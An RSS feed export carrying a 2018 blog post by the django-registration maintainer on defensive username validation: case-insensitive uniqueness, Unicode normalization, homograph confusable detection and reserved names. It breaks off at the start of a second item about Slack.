<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Let’s talk about usernames</title>
<link>https://www.b-list.org/weblog/2018/feb/11/usernames/</link>
<guid isPermaLink="true" >https://www.b-list.org/weblog/2018/feb/11/usernames/</guid>
<description>&lt;p class=&quot;meta&quot;&gt;Published: &lt;a href=&quot;https://www.b-list.org/weblog/2018/feb/11/&quot;&gt;February 11, 2018&lt;/a&gt;. Filed under: &lt;a href=&quot;https://www.b-list.org/weblog/categories/django/&quot;&gt;Django&lt;/a&gt;, &lt;a href=&quot;https://www.b-list.org/weblog/categories/pedantics/&quot;&gt;Pedantics&lt;/a&gt;, &lt;a href=&quot;https://www.b-list.org/weblog/categories/programming/&quot;&gt;Programming&lt;/a&gt;, &lt;a href=&quot;https://www.b-list.org/weblog/categories/python/&quot;&gt;Python&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A few weeks ago I released &lt;a href=&quot;https://www.b-list.org/projects/django-registration/&quot;&gt;django-registration&lt;/a&gt; 2.4.1. The 2.4 series is the last in the django-registration 2.x line, and from here on out it’ll only get bugfixes. The &lt;code&gt;master&lt;/code&gt; branch is now prepping for 3.0, which will remove a lot of the deprecated cruft that’s accumulated over the past decade of maintaining it, and try to focus on best practices for modern Django applications.&lt;/p&gt;
&lt;p&gt;I’ll write more about that sometime soon, but right now I want to spend a little bit of time talking about a deceptively hard problem django-registration has to deal with: usernames. And while I could write this as one of those “falsehoods programmers believe about X” articles, my personal preference is to actually explain why this is trickier than people think, and offer some advice on how to deal with it, rather than just provide mockery with no useful context.&lt;/p&gt;
&lt;h2&gt;Aside: the right way to do identity&lt;/h2&gt;
&lt;p&gt;Usernames — as implemented by many sites and services, and by many popular frameworks (including Django) — are almost certainly not the right way to solve the problem they’re often used to solve. What we really want in terms of identifying users is some combination of:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;System-level identifier, suitable for use as a target of foreign keys in our database&lt;/li&gt;
&lt;li&gt;Login identifier, suitable for use in performing a credential check&lt;/li&gt;
&lt;li&gt;Public identity, suitable for displaying to other users&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Many systems ask the username to fulfill all three of these roles, which is probably wrong. A better approach is &lt;a href=&quot;http://habitatchronicles.com/2008/10/the-tripartite-identity-pattern/&quot;&gt;the tripartite identity pattern&lt;/a&gt;, in which each identifier is distinct, and multiple login and/or public identifiers may be associated with a single system identifier.&lt;/p&gt;
&lt;p&gt;Many of the problems and pains I’ve seen with people trying to build and scale account systems have come down to ignoring this pattern. An unfortunate number of hacks have been built on top of systems which &lt;em&gt;don’t&lt;/em&gt; have this pattern, in order to make them look or sort-of act as if they do.&lt;/p&gt;
&lt;p&gt;So if you’re building an account system from scratch today in 2018, I would suggest reading up on this pattern and using it as the basis of your implementation. The flexibility it will give you in the future is worth a little bit of work, and one of these days someone might even build a good generic reusable implementation of it (I’ve certainly given thought to doing this for Django, and may still do it one day).&lt;/p&gt;
&lt;p&gt;For the rest of this post, though, I’ll be assuming that you’re using a more common implementation where a unique username serves as at least a system and login identifier, and probably also a public identifier. And by “username” I mean essentially any string identifier; you may be using usernames in the sense that, say, Reddit or Hacker News do, or you might be using email addresses, or you might be using some other unique string. But no matter what, you’re probably using &lt;em&gt;some&lt;/em&gt; kind of single unique string for this, and that means you need to be aware of some issues.&lt;/p&gt;
&lt;h2&gt;Uniqueness is harder than you think&lt;/h2&gt;
&lt;p&gt;You might be thinking to yourself, how hard can this be? We can just create a unique column and we’re good to go! Here, let’s make a user table in Postgres:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accounts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;SERIAL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PRIMARY&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TEXT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNIQUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;email_address&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TEXT&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There’s our user table, there’s our unique username column. Easy!&lt;/p&gt;
&lt;p&gt;Well, it’s easy until we start thinking about case. If you’re registered as &lt;code&gt;john_doe&lt;/code&gt;, what happens if I register as &lt;code&gt;JOHN_DOE&lt;/code&gt;? It’s a different username, but could I cause people to think I’m you? Could I get people to accept friend requests or share sensitive information with me because they don’t realize case matters to a computer?&lt;/p&gt;
&lt;p&gt;This is a simple thing that a lot of systems get wrong. In researching for this post, I discovered Django’s auth system doesn’t enforce case-insensitive uniqueness of usernames, despite getting quite a lot of other things generally right in its implementation. There is a ticket for making usernames case-insensitive, but it’s &lt;span class=&quot;caps&quot;&gt;WONTFIX&lt;/span&gt; now because making usernames case-insensitive would be a massive backwards-compatibility break and nobody’s sure whether or how we could actually do it. I’ll probably look at enforcing it in django-registration 3.0, but I’m not sure it’ll be possible to do even there — any site with existing case-sensitive accounts that bolts on a case-insensitive solution is asking for trouble.&lt;/p&gt;
&lt;p&gt;So if you’re going to build a system from scratch today, you should be doing case-insensitive uniqueness checks on usernames from day one; &lt;code&gt;john_doe&lt;/code&gt;, &lt;code&gt;John_Doe&lt;/code&gt;, and &lt;code&gt;JOHN_DOE&lt;/code&gt; should all be the same username in your system, and once one of them is registered, none of the others should be available.&lt;/p&gt;
&lt;p&gt;But that’s just the start; we live in a Unicode world, and determining if two usernames are the same in a Unicode world is more complex than just doing &lt;code&gt;username1 == username2&lt;/code&gt;. For one thing, there are composed and decomposed forms which are distinct when compared as sequences of Unicode code points, but render on-screen as visually identical to each other. So now you need to talk about normalization, pick a normalization form, and then normalize every username to your chosen form &lt;em&gt;before&lt;/em&gt; you do any uniqueness checks.&lt;/p&gt;
&lt;p&gt;You also need to be considering non-&lt;abbr title=&quot;American Standard Code for Information Interchange&quot;&gt;&lt;span class=&quot;caps&quot;&gt;ASCII&lt;/span&gt;&lt;/abbr&gt; when thinking about how to do your case-insensitive checks. Is &lt;code&gt;StraßburgJoe&lt;/code&gt; the same user as &lt;code&gt;StrassburgJoe&lt;/code&gt;? What answer you get will often depend on whether you do your check by normalizing to lowercase or uppercase. And then there are the different ways of decomposing Unicode; you can and will get different results for many strings depending on whether you use canonical equivalence or compatibility.&lt;/p&gt;
&lt;p&gt;If all this is confusing — and it is, even if you’re a Unicode geek! — my recommendation is to follow &lt;a href=&quot;http://www.unicode.org/reports/tr36/#Recommendations_General&quot;&gt;the advice of Unicode Technical Report 36&lt;/a&gt; and normalize usernames using &lt;abbr title=&quot;Compatibility Decomposition, Canonical Composition&quot;&gt;&lt;span class=&quot;caps&quot;&gt;NFKC&lt;/span&gt;&lt;/abbr&gt;. If you’re using Django’s &lt;code&gt;UserCreationForm&lt;/code&gt; or a subclass of it (django-registration uses subclasses of &lt;code&gt;UserCreationForm&lt;/code&gt;), this is already done for you. If you’re using Python but not Django (or not using &lt;code&gt;UserCreationForm&lt;/code&gt;), you can do this in one line using a helper from the standard library:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;unicodedata&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;username_normalized&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unicodedata&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'NFKC'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For other languages, look up a good Unicode library.&lt;/p&gt;
&lt;h2&gt;No, really, uniqueness is harder than you think&lt;/h2&gt;
&lt;p&gt;Unfortunately, that’s not the end of it. Case-insensitive uniqueness checks on normalized strings are a start, but won’t catch all the cases you probably need to catch. For example, consider the following username: &lt;code&gt;jane_doe&lt;/code&gt;. Now consider another username: &lt;code&gt;jаne_doe&lt;/code&gt;. Are these the same username?&lt;/p&gt;
&lt;p&gt;In the tyepface I’m using as I write this, and in the typeface my blog uses, they &lt;em&gt;appear&lt;/em&gt; to be. But to software, they’re very much &lt;em&gt;not&lt;/em&gt; the same, and still aren’t the same after Unicode normalization and case-insensitive comparison (whether you go to upper- or lower-case doesn’t matter).&lt;/p&gt;
&lt;p&gt;To see why, pay attention to the second code point. In one of the usernames above, it’s &lt;code&gt;U+0061 LATIN SMALL LETTER A&lt;/code&gt;. But in the other, it’s &lt;code&gt;U+0430 CYRILLIC SMALL LETTER A&lt;/code&gt;. And no amount of Unicode normalization or case insensitivity will make those be the same code point, even though they’re often visually indistinguishable.&lt;/p&gt;
&lt;p&gt;This is the basis of the homograph attack, which first gained widespread notoriety in the context of &lt;a href=&quot;https://en.wikipedia.org/wiki/IDN_homograph_attack&quot;&gt;internationalized domain names&lt;/a&gt;. And solving it requires a bit more work.&lt;/p&gt;
&lt;p&gt;For network host names, one solution is to represent names in &lt;a href=&quot;https://en.wikipedia.org/wiki/Punycode&quot;&gt;Punycode&lt;/a&gt;, which is designed to head off precisely this issue, and also provides a way to represent a non-&lt;abbr title=&quot;American Standard Code for Information Interchange&quot;&gt;&lt;span class=&quot;caps&quot;&gt;ASCII&lt;/span&gt;&lt;/abbr&gt; name using only &lt;abbr title=&quot;American Standard Code for Information Interchange&quot;&gt;&lt;span class=&quot;caps&quot;&gt;ASCII&lt;/span&gt;&lt;/abbr&gt; characters. Returning to our example usernames above, this makes the distinction between the two obvious. If you want to try it yourself, it’s a one-liner in Python. Here it is on the version which includes the Cyrillic ‘а’:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot; readability=&quot;7&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'jаne_doe'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'punycode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;b'jne_doe-2fg'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;(if you have difficulty copy/pasting the non-&lt;abbr title=&quot;American Standard Code for Information Interchange&quot;&gt;&lt;span class=&quot;caps&quot;&gt;ASCII&lt;/span&gt;&lt;/abbr&gt; character, you can also express it in a string literal as &lt;code&gt;j\u0430ne_doe&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;But this isn’t a real solution for usernames; sure, you could use Punycode representation whenever you display a name, but it will break display of a lot of perfectly legitimate non-&lt;abbr title=&quot;American Standard Code for Information Interchange&quot;&gt;&lt;span class=&quot;caps&quot;&gt;ASCII&lt;/span&gt;&lt;/abbr&gt; names, and what you probably really &lt;em&gt;want&lt;/em&gt; is to reject the above username during your signup process. How can you do that?&lt;/p&gt;
&lt;p&gt;Well, this time we open our hymnals to &lt;a href=&quot;http://www.unicode.org/reports/tr39/&quot;&gt;Unicode Technical Report 39&lt;/a&gt;, and begin reading sections 4 and 5. Sets of code points which are distinct (even after normalization) but visually identical or at least confusingly similar when rendered for display are called (appropriately) “confusables”, and Unicode does provide mechanisms for detecting the presence of such code points.&lt;/p&gt;
&lt;p&gt;The example username we’ve been looking at here is what Unicode terms a “mixed-script confusable”, and this is what we probably want to detect. In other words: an all-Latin username containing confusables is probably fine, and an all-Cyrillic username containing confusables is probably fine, but a username containing mostly Latin plus one Cyrillic code point which happens to be confusable with a Latin one… is not.&lt;/p&gt;
&lt;p&gt;Unfortunately, Python doesn’t provide the necessary access to the full set of Unicode properties and tables in the standard library to be able to do this. But a helpful developer named Victor Felder has written &lt;a href=&quot;http://confusable-homoglyphs.readthedocs.io/en/latest/index.html&quot;&gt;a library which provides what we need&lt;/a&gt;, and released it under an open-source license. Using the &lt;code&gt;confusable_homoglyphs&lt;/code&gt; library, we can detect the problem:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;confusable_homoglyphs&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;confusables&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'jane_doe'&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'j&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u0430&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;ne_doe'&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;confusables&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_dangerous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;False&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;confusables&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_dangerous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The actual output of &lt;a href=&quot;http://confusable-homoglyphs.readthedocs.io/en/latest/apidocumentation.html#confusable_homoglyphs.confusables.is_dangerous&quot;&gt;is_dangerous()&lt;/a&gt;, for the second username, is a data structure containing detailed information about the potential problems, but what we care about is that it detects a mixed-script string containing code points which are confusable, and that’s what we want.&lt;/p&gt;
&lt;p&gt;Django allows non-&lt;abbr title=&quot;American Standard Code for Information Interchange&quot;&gt;&lt;span class=&quot;caps&quot;&gt;ASCII&lt;/span&gt;&lt;/abbr&gt; in usernames, but does not check for homograph problems. Since version 2.3, though, django-registration has had a dependency on &lt;code&gt;confusable_homoglyphs&lt;/code&gt;, and has used its &lt;code&gt;is_dangerous()&lt;/code&gt; function as part of the validation for usernames and email addresses. If you need to do user signups in Django (or generally in Python), and can’t or don’t want to use django-registration, I encourage you to make use of &lt;code&gt;confusable_homoglyphs&lt;/code&gt; in the same way..&lt;/p&gt;
&lt;h2&gt;Have I mentioned that uniqueness is hard?&lt;/h2&gt;
&lt;p&gt;Once we’re dealing with Unicode confusables, it’s worth also asking whether we should deal with &lt;em&gt;single-script&lt;/em&gt; confusables. For example, &lt;code&gt;paypal&lt;/code&gt; and &lt;code&gt;paypa1&lt;/code&gt;, which (depending on your choice of typeface) may be difficult to distinguish from one another. So far, everything I’ve suggested is good general-purpose advice, but this is starting to get into things which are specific to particular languages, scripts or geographic regions, and should only be done with care and with the potential tradeoffs in mind (forbidding confusable Latin characters may end up with a higher false-positive rate than you’d like, for example). But it is something worth thinking about. The same goes for usernames which are distinct but still very similar to each other; you can check this at the database level in a variety of ways — Postgres, for example, ships with support for &lt;a href=&quot;https://en.wikipedia.org/wiki/Soundex&quot;&gt;Soundex&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaphone&quot;&gt;Metaphone&lt;/a&gt;, as well as &lt;a href=&quot;https://en.wikipedia.org/wiki/Levenshtein_distance&quot;&gt;Levenshtein distance&lt;/a&gt; and &lt;a href=&quot;https://www.postgresql.org/docs/9.6/static/pgtrgm.html&quot;&gt;trigram fuzzy matching&lt;/a&gt; — but again it’s going to be something you do on a case-by-case basis, rather than just something you should generally always do.&lt;/p&gt;
&lt;p&gt;There is one more uniqueness issue I want to mention, though, and it primarily affects email addresses, which often get used as usernames these days (especially in services which rely on a third-party identity provider and use OAuth or similar protocols). So assume you’ve got a case for enforcing uniqueness of email addresses. How many distinct email addresses are listed below?&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;johndoe@example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;johndoe+yoursite@example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;john.doe@example.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The answer is “it depends”. Most &lt;abbr title=&quot;Mail Transfer Agents&quot;&gt;MTAs&lt;/abbr&gt; have long ignored anything after a &lt;code&gt;+&lt;/code&gt; in the local-part when determining recipient identity, which in turn has led to many people using text after a &lt;code&gt;+&lt;/code&gt; as a sort of &lt;em&gt;ad hoc&lt;/em&gt; tagging and filtering system. And Gmail famously ignores dot (&lt;code&gt;.&lt;/code&gt;) characters in the local-part, including in their custom-domain offerings, so it’s impossible without doing &lt;abbr title=&quot;Domain Name System&quot;&gt;&lt;span class=&quot;caps&quot;&gt;DNS&lt;/span&gt;&lt;/abbr&gt; lookups to figure out whether someone’s mail provider actually thinks &lt;code&gt;johndoe&lt;/code&gt; and &lt;code&gt;john.doe&lt;/code&gt; are distinct.&lt;/p&gt;
&lt;p&gt;So if you’re enforcing unique email addresses, or using email addresses as a user identifier, you need to be aware of this and you probably need to strip all dot characters from the local-part, along with &lt;code&gt;+&lt;/code&gt; and any text after it, before doing your uniqueness check. Currently django-registration doesn’t do this, but I have plans to add it in the 3.x series.&lt;/p&gt;
&lt;p&gt;Also, for dealing with Unicode confusables in email addresses: apply that check to the local-part and the domain &lt;em&gt;separately&lt;/em&gt;. People don’t always have control over the script used for the domain, and shouldn’t be punished for choosing something that causes the local-part to be in a single script distinct from the domain; as long as neither the local-part nor the domain, considered in isolation, are mixed-script confusable, the address is probably &lt;span class=&quot;caps&quot;&gt;OK&lt;/span&gt; (and this is what django-registration’s validator does).&lt;/p&gt;
&lt;p&gt;There are a lot of other concerns you can have about usernames which are too similar to each other to be considered “distinct”, but once you deal with case-insensitivity, normalization, and confusables, you start getting into diminishing-returns territory pretty quickly, especially since many rules start being language-, script-, or region-specific. That doesn’t mean you shouldn’t think about them, just that it’s difficult to give general-purpose advice.&lt;/p&gt;
&lt;p&gt;So let’s switch things up a bit and consider a different category of problem.&lt;/p&gt;
&lt;h2&gt;You should have reservations about some names&lt;/h2&gt;
&lt;p&gt;Many sites use the username as more than just a field in the login form. Some will create a profile page for each user, and put the username in the &lt;abbr title=&quot;Uniform Resource Locator&quot;&gt;&lt;span class=&quot;caps&quot;&gt;URL&lt;/span&gt;&lt;/abbr&gt;. Some might create email addresses for each user. Some might create subdomains. So here are some questions:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;If your site puts the username in the &lt;abbr title=&quot;Uniform Resource Locator&quot;&gt;&lt;span class=&quot;caps&quot;&gt;URL&lt;/span&gt;&lt;/abbr&gt; of the user’s profile page, what would happen if I created a user named &lt;code&gt;login&lt;/code&gt;? If I were to populate my profile with the text “Our log-in page has moved, please click here to log in”, with a link to my credential-harvesting site, how many of your users do you think I could fool?&lt;/li&gt;
&lt;li&gt;If your site creates email addresses from usernames, what happens if I sign up as a user named &lt;code&gt;webmaster&lt;/code&gt; or &lt;code&gt;postmaster&lt;/code&gt;? Will I get email directed to those addresses for your domain? Could I potentially obtain an &lt;abbr title=&quot;Secure Sockets Layer&quot;&gt;&lt;span class=&quot;caps&quot;&gt;SSL&lt;/span&gt;&lt;/abbr&gt; certificate for your domain with the right username and auto-created email address?&lt;/li&gt;
&lt;li&gt;If your site creates subdomains from usernames, what happens if I sign up as a user named &lt;code&gt;www&lt;/code&gt;? Or &lt;code&gt;smtp&lt;/code&gt; or &lt;code&gt;mail&lt;/code&gt;?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;If you think these are just silly hypotheticals, well, &lt;a href=&quot;http://www.theregister.co.uk/2011/04/11/state_of_ssl_analysis/&quot;&gt;some of them have actually happened&lt;/a&gt;. And not just once, but &lt;a href=&quot;https://www.tivi.fi/Kaikki_uutiset/2015-03-18/A-Finnish-man-created-this-simple-email-account---and-received-Microsofts-security-certificate-3217662.html&quot;&gt;multiple times&lt;/a&gt;. No really, &lt;a href=&quot;https://twitter.com/EdOverflow/status/954093588362809345&quot;&gt;these things have happened multiple times&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You can — and should — be taking some precautions to ensure that, say, an auto-created subdomain for a user account doesn’t conflict with a pre-existing subdomain you’re actually using or that has a special meaning, or that auto-created email addresses can’t clash with important/pre-existing ones.&lt;/p&gt;
&lt;p&gt;But to really be careful, you should probably also just disallow certain usernames from being registered. I first saw this suggestion — and a list of names to reserve, and the first two articles linked above — in &lt;a href=&quot;https://ldpreload.com/blog/names-to-reserve&quot;&gt;this blog post by Geoffrey Thomas&lt;/a&gt;. Since version 2.1, django-registration has shipped a list of reserved names, and the list has grown with each release; it’s now around a hundred items.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ubernostrum/django-registration/blob/1d7d0f01a24b916977016c1d66823a5e4a33f2a0/registration/validators.py#L25&quot;&gt;The list in django-registration&lt;/a&gt; breaks names down into a few categories, which lets you compose subsets of them based on your needs (the default validator combines all of them, but lets you override with your own preferred set of reserved names):&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Hostnames used for autodiscovery/autoconfig of some well-known services&lt;/li&gt;
&lt;li&gt;Hostnames associated with common protocols&lt;/li&gt;
&lt;li&gt;Email addresses used by certificate authorities to verify domain ownership&lt;/li&gt;
&lt;li&gt;Email addresses listed in &lt;a href=&quot;https://tools.ietf.org/html/rfc2142&quot;&gt;&lt;span class=&quot;caps&quot;&gt;RFC&lt;/span&gt; 2142&lt;/a&gt; that don’t appear in any other subset of reserved names&lt;/li&gt;
&lt;li&gt;Common no-reply email addresses&lt;/li&gt;
&lt;li&gt;Strings which match sensitive filenames (like cross-domain access policies)&lt;/li&gt;
&lt;li&gt;A laundry list of other potentially-sensitive names like &lt;code&gt;contact&lt;/code&gt; and &lt;code&gt;login&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The validator in django-registration will also reject any username which begins with &lt;code&gt;.well-known&lt;/code&gt;, to protect anything which uses the &lt;a href=&quot;https://tools.ietf.org/html/rfc5785&quot;&gt;&lt;span class=&quot;caps&quot;&gt;RFC&lt;/span&gt; 5785&lt;/a&gt; system for “well-known locations”.&lt;/p&gt;
&lt;p&gt;As with confusables in usernames, I encourage you to copy from and improve on django-registration’s list, which in turn is based on and expanded from Geoffrey Thomas’ list.&lt;/p&gt;
&lt;h2&gt;It’s a start&lt;/h2&gt;
&lt;p&gt;The ideas above are not an exhaustive list of all the things you could or should do to validate usernames in sites and services you build, because if I started trying to write an exhaustive list, I’d be here forever. They are, though, a good baseline of things you can do, and I’d recommend you do most or all of them. And hopefully this has provided a good introduction to the lurking complexity of something as seemingly “simple” as user accounts with usernames.&lt;/p&gt;
&lt;p&gt;As I’ve mentioned, Django and/or django-registration already do most of these, and the ones that they don’t are likely to be added at least to django-registration in 3.0; Django itself may not be able to adopt some of them soon, if ever, due to stronger backwards-compatibility concerns. All the code is open source (&lt;abbr title=&quot;Berkeley Software Distribution&quot;&gt;&lt;span class=&quot;caps&quot;&gt;BSD&lt;/span&gt;&lt;/abbr&gt; license) and so you should feel free to copy, adapt or improve it.&lt;/p&gt;
&lt;p&gt;And if there’s something important I’ve missed, please feel free to let me know about it; you can file a bug or pull request to &lt;a href=&quot;https://github.com/ubernostrum/django-registration&quot;&gt;django-registration on GitHub&lt;/a&gt;, or just &lt;a href=&quot;https://www.b-list.org/contact/&quot;&gt;get in touch with me directly&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Mon, 12 Feb 2018 03:52:23 +0000</pubDate>
<dc:creator>acjohnson55</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.b-list.org/weblog/2018/feb/11/usernames/</dc:identifier>
</item>
<item>
<title>Slack is the opposite of organizational memory</title>
<link>https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html</link>
<guid isPermaLink="true" >https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html</guid>
<description>&lt;ol id=&quot;markdown-toc&quot;&gt;&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#interruptions&quot; id=&quot;markdown-toc-interruptions&quot;&gt;Interruptions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#the-format-is-fragmented-and-constrained&quot; id=&quot;markdown-toc-the-format-is-fragmented-and-constrained&quot;&gt;The format is fragmented and constrained&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#slack-search-is-broken&quot; id=&quot;markdown-toc-slack-search-is-broken&quot;&gt;slack search is broken&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#it-increases-productivity-the-bad-kind&quot; id=&quot;markdown-toc-it-increases-productivity-the-bad-kind&quot;&gt;It increases productivity (the bad kind)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#it-replaces-documentation&quot; id=&quot;markdown-toc-it-replaces-documentation&quot;&gt;It replaces documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#what-does-slack-do-right&quot; id=&quot;markdown-toc-what-does-slack-do-right&quot;&gt;What does slack do right&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#trello--jira&quot; id=&quot;markdown-toc-trello--jira&quot;&gt;trello &amp;amp; jira&lt;/a&gt;&lt;/li&gt;
